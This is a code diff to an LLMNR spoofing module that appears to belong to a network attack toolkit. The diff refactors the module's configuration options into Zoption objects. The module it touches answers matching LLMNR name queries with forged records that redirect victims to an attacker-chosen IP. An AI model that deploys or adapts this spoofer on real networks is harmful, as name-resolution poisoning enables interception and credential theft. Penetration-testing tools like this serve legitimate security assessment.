@@ -1,6 +1,7 @@
 from scapy.all import *
 from poison import Poison
 from threading import Thread
+from zoption import Zoption
 import util
 import config
 
@@ -10,14 +11,14 @@ class llmnr(Poison):
         super(llmnr, self).__init__("LLMNR Spoofer")
         conf.verb = 0
         self.local = (config.get('ip_addr'), get_if_hwaddr(config.get('iface')))
-        self.config.update({"regex_match":{"type":"regex", 
-                                           "value":None,
-                                           "required":True, 
-                                           "display":"Match request regex"},
-                            "redirect":{"type":"ip", 
-                                        "value":None,
-                                        "required":True, 
-                                        "display":"Redirect to"}
+        self.config.update({"regex_match":Zoption(type = "regex", 
+                                           value = None,
+                                           required = True, 
+                                           display = "Match request regex"),
+                            "redirect":Zoption(type = "ip", 
+                                        value = None,
+                                        required = True, 
+                                        display = "Redirect to")
                            })
         self.info = """
                     Poisoner for LLMNR.  LLMNR is essentially DNS + NBNS
@@ -38,7 +39,7 @@ class llmnr(Poison):
         """ Handle and parse requests """
         if pkt.haslayer(LLMNRQuery):
             request = pkt[LLMNRQuery][DNSQR].qname
-            ret = self.config['regex_match']['value'].search(request.lower())
+            ret = self.config['regex_match'].value.search(request.lower())
             if ret is None:
                 return
 
@@ -66,7 +67,7 @@ class llmnr(Poison):
             packet.
         """
         return DNSRR(rrname=pkt[LLMNRQuery].qd.name, ttl=40000, rdlen=4,
-                rdata=self.config['redirect']['value'])
+                rdata=self.config['redirect'].value)
 
     def sniff_thread(self):
         """ LLMNR is on UDP port 5355
@@ -83,5 +84,5 @@ class llmnr(Poison):
 
     def session_view(self):
         """ Override session view"""
-        return '%s -> %s' % (self.config['regex_match']['value'].pattern,
-                 self.config['redirect']['value'])
+        return '%s -> %s' % (self.config['regex_match'].getStr(),
+                 self.config['redirect'].value)
